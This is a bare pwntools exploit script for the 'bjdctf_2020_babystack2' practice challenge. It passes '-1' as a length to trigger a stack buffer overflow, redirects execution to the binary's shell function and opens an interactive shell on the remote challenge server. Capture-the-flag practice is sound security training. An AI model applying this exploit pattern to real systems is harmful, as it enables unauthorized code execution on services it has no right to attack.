from pwn import *
from LibcSearcher import *
import pwnlib
elf = ELF("./bjdctf_2020_babystack2")
# sh = process("./bjdctf_2020_babystack2")
sh = remote("node3.buuoj.cn",28920)
system = 0x400726
main = elf.symbols['main']
bin_sh = 0x4008B8
payload = 'a' * (0x10+8) + p64(system) *2
sh.sendlineafter("[+]Please input the length of your name:\n","-1")
# gdb.attach(sh)
sh.sendlineafter("[+]What's u name?\n",payload)
sh.interactive()